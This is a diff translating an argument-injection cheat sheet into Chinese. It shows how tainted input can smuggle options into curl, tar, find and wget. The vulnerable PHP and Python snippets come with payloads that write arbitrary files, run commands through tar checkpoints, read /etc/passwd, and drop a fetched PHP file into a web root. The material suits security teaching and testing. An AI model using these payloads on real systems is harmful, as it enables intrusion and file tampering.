@@ -1,13 +1,15 @@
-# Argument Injection
-Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.
+# 参数注入
 
-It can happen in different situations, where you can only inject arguments to a command:
+参数注入与命令注入类似，因为未经过适当的清理/转义，受污染的数据被传递给在shell中执行的命令。
 
-- Improper sanitization (regex)
-- Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen)
-- Bash expansion (ex: *)
+在不同的情况下都可能发生参数注入，你只能向命令注入参数：
 
-In the following example, a python script takes the inputs from the command line to generate a ```curl``` command:
+- 不当的清理（正则表达式）
+- 注入参数到固定命令中（PHP:escapeshellcmd, Python: Popen）
+- Bash扩展（例如：*）
+
+在以下示例中，一个Python脚本从命令行接收输入来生成一个```curl```命令：
+
 ```py
 from shlex import quote,split
 import sys
@@ -19,82 +21,100 @@ if __name__=="__main__":
     print(command)
     r = subprocess.Popen(command)
 ```
-It is possible for an attacker to pass several words to abuse options from ```curl``` command
+
+攻击者可以传递多个单词来滥用```curl```命令的选项
+
 ```ps1
 python python_rce.py "https://www.google.fr -o test.py" 
 ```
-We can see by printing the command that all the parameters are splited allowing to inject an argument that will save the response in an arbitrary file.
+
+通过打印命令，我们可以看到所有参数都被分割，允许注入一个参数将响应保存到一个任意文件中。
+
 ```ps1
 ['curl', 'https://www.google.fr', '-o', 'test.py']
 ```
-## Summary
 
-* [List of exposed commands](#list-of-exposed-commands)
+## 总结
+
+* [暴露的命令列表](#list-of-exposed-commands)
   * [CURL](#CURL)
   * [TAR](#TAR)
   * [FIND](#FIND)
   * [WGET](#WGET)
-* [References](#references)
+* [参考资料](#references)
 
 
-## List of exposed commands
+## 暴露的命令列表
 
 ### CURL
-It is possible to abuse ```curl``` through the following options:
+
+可以通过以下选项滥用```curl```：
 
 ```ps1
- -o, --output <file>        Write to file instead of stdout
- -O, --remote-name          Write output to a file named as the remote file
+ -o, --output <file>        写入文件而不是标准输出
+ -O, --remote-name          将输出写入一个名为远程文件的文件
 ```
-In case there is already one option in the command it is possible to inject several URLs to download and several output options. Each option will affect each URL in sequence.
+
+如果命令中已经有一个选项，可以注入多个URL进行下载和多个输出选项。每个选项将依次影响每个URL。
 
 ### TAR
-For the ```tar``` command it is possible to inject arbitrary arguments in different commands. 
 
-Argument injection can happen into the '''extract''' command:
+对于```tar```命令，可以在不同的命令中注入任意参数。 
+
+参数注入可能发生在'''extract'''命令中：
+
 ```ps1
 --to-command <command>
 --checkpoint=1 --checkpoint-action=exec=<command>
--T <file> or --files-from <file>
+-T <file> 或 --files-from <file>
 ```
 
-Or in the '''create''' command:
+或者在'''create'''命令中：
+
 ```ps1
--I=<program> or -I <program>
+-I=<program> 或 -I <program>
 --use-compres-program=<program>
 ```
-There are also short options to work without spaces:
+
+还有短选项可以在不使用空格的情况下工作：
+
 ```ps1
 -T<file>
 -I"/path/to/exec"
 ```
 
 ### FIND
-Find some_file inside /tmp directory.
+
+在/tmp目录内查找某个文件。
+
 ```php
 $file = "some_file";
 system("find /tmp -iname ".escapeshellcmd($file));
 ```
 
-Print /etc/passwd content.
+打印/etc/passwd内容。
+
 ```php
 $file = "sth -or -exec cat /etc/passwd ; -quit";
 system("find /tmp -iname ".escapeshellcmd($file));
 ```
 
 ### WGET
-Example of vulnerable code
+
+易受攻击的代码示例
+
 ```php
 system(escapeshellcmd('wget '.$url));
 ```
-Arbitrary file write
+
+任意文件写入
+
 ```php
 $url = '--directory-prefix=/var/www/html http://example.com/example.php';
 ```
 
+## 参考资料
 
-## References
-
-- [staaldraad - Etienne Stalmans, November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
-- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014](https://www.exploit-db.com/papers/33930)
-- [TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek,  Apr 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
+- [staaldraad - Etienne Stalmans, 2019年11月24日](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
+- [回到未来：Unix通配符失控 - Leon Juranic, 2014年6月25日](https://www.exploit-db.com/papers/33930)
+- [TL;DR: 如何利用/绕过/使用PHP escapeshellarg/escapeshellcmd函数 - kacperszurek, 2018年4月25日](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
